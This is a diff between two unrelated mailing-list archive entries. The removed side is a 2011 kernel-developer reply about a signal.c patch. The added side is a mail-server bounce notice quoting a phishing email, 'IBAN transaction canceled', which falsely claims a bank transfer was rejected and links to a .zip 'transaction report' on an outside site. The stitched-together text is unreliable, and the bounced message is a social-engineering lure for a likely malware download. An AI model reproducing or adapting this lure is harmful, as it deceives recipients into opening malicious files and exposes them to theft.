@@ -1,14 +1,11 @@
-From: Jiri Slaby <jirislaby-Re5JQEeQqe8AvxtiuMwx3w@public.gmane.org>
-Subject: Re: [PATCH 1/1] __send_signal: pass q->info, not info,
-	to userns_fixup_signal_uid (v2)
-Date: Sat, 19 Nov 2011 17:06:49 +0100
-Message-ID: <4EC7D419.1090404@gmail.com>
-References: <20111119004148.GA16259@sergelap>
+From: MAILER-DAEMON-9pixCdsBRzuPPhimtgtZJlkDBhES+CswOmWvHUIwkkk@public.gmane.org
+Subject: failure notice
+Date: 19 Nov 2011 17:12:25 +0000
+Message-ID: <20111119171730.6DB5B422@mail.linuxfoundation.org>
 Mime-Version: 1.0
 Content-Type: text/plain; charset="us-ascii"
 Content-Transfer-Encoding: 7bit
 Return-path: <containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-In-Reply-To: <20111119004148.GA16259@sergelap>
 List-Unsubscribe: <https://lists.linuxfoundation.org/mailman/options/containers>,
 	<mailto:containers-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=unsubscribe>
 List-Archive: <http://lists.linuxfoundation.org/pipermail/containers/>
@@ -18,45 +15,44 @@ List-Subscribe: <https://lists.linuxfoundation.org/mailman/listinfo/containers>,
 	<mailto:containers-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=subscribe>
 Sender: containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 Errors-To: containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
-To: Serge Hallyn <serge.hallyn-Z7WLFzj8eWMS+FvcfC7Uqw@public.gmane.org>
-Cc: richard-/L3Ra7n9ekc@public.gmane.org, containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org, oleg-H+wXaHxf7aLQT0dZR+AlfA@public.gmane.org, eparis-H+wXaHxf7aLQT0dZR+AlfA@public.gmane.org, linux-kernel-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, dhowells-H+wXaHxf7aLQT0dZR+AlfA@public.gmane.org, "Eric W. Biederman" <ebiederm-aS9lmoZGLiVWk0Htik3J/w@public.gmane.org>, Andrew Morton <akpm-de/tnXTf+JLsfHDXvbKv3WD2FQJk+8+b@public.gmane.org>
+To: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 List-Id: containers.vger.kernel.org
 
-On 11/19/2011 01:41 AM, Serge Hallyn wrote:
-> Eric Biederman pointed out that passing info is a bug and could lead
-> to a NULL pointer deref to boot.
+Hi. This is the qmail-send program at s15408694.onlinehome-server.info.
+I'm afraid I wasn't able to deliver your message to the following addresses.
+This is a permanent error; I've given up. Sorry it didn't work out.
 
-It would be great if you could describe what bug you are fixing in fact
-in the commit log. "Something that could lead to a bug" is not helpful
-at all.
+<info-5PkbVSOlqMA6aLFHrx/NFE6FHaWFtxp8@public.gmane.org>:
+217.194.8.28 failed after I sent the message.
+Remote host said: 550 5.7.1 Blocked by SpamAssassin
 
-A link to the thread where Eric pointed *that* out would be enough.
+--- Below this line is a copy of the message.
 
-> A collection of signal, securebits, filecaps, cap_bounds, and a few other ltp
-> tests passed with this kernel.
-> 
-> Changelog:
->     Nov 18: previous patch missed a leading '&'
-> 
-> Signed-off-by: Serge Hallyn <serge.hallyn-Z7WLFzj8eWMS+FvcfC7Uqw@public.gmane.org>
-> ---
->  kernel/signal.c |    2 +-
->  1 files changed, 1 insertions(+), 1 deletions(-)
-> 
-> diff --git a/kernel/signal.c b/kernel/signal.c
-> index c0f0782..170586b 100644
-> --- a/kernel/signal.c
-> +++ b/kernel/signal.c
-> @@ -1118,7 +1118,7 @@ static int __send_signal(int sig, struct siginfo *info, struct task_struct *t,
->  			break;
->  		}
->  
-> -		userns_fixup_signal_uid(info, t);
-> +		userns_fixup_signal_uid(&q->info, t);
->  
->  	} else if (!is_si_special(info)) {
->  		if (sig >= SIGRTMIN && info->si_code != SI_USER) {
+Return-Path: <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+Received: (qmail 6100 invoked from network); 19 Nov 2011 18:12:23 +0100
+Received: from 173-203-205-227.static.cloud-ips.com (HELO cg2) (173.203.205.227)
+  by s15408694.onlinehome-server.info with SMTP; 19 Nov 2011 18:12:23 +0100
+Received: from [173.203.205.227] by cg2 id GNpIblwU2tQIvlx; Sat, 19 Nov 2011 17:12:20 +0000
+Message-ID: <00bb01cca6de$638c6e80$0500a8c0@cg2>
+From: "NLFCU" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+To: <info-5PkbVSOlqMA6aLFHrx/NFE6FHaWFtxp8@public.gmane.org>
+Subject: IBAN transaction canceled
+Date: Sat, 19 Nov 2011 17:12:20 +0000
+MIME-Version: 1.0
+Content-Type: text/plain;
+	charset="windows-1252"
+Content-Transfer-Encoding: 8bit
 
-thanks,
--- 
-js
+
+
+The IBAN transaction, recently sent from your bank account (by you or any other person), 
+was rejected by the Electronic Payments Association.
+
+Canceled transaction
+Transaction ID: 101066954537 Rejection Reason See details in the report below Transaction Report 
+http://www.panaceastore.eu/clientedown/Info.zip?IBAN_Delivery_info-5PkbVSOlqMA6aLFHrx/NFE6FHaWFtxp8@public.gmane.org_HashCrypt=0VuwzxqQFlCD
+
+54785 Sunrise Valley Drive, Suite 130
+Herndon, VA 54759
+
+2011 NLFCU - The Electronic Payments Association.
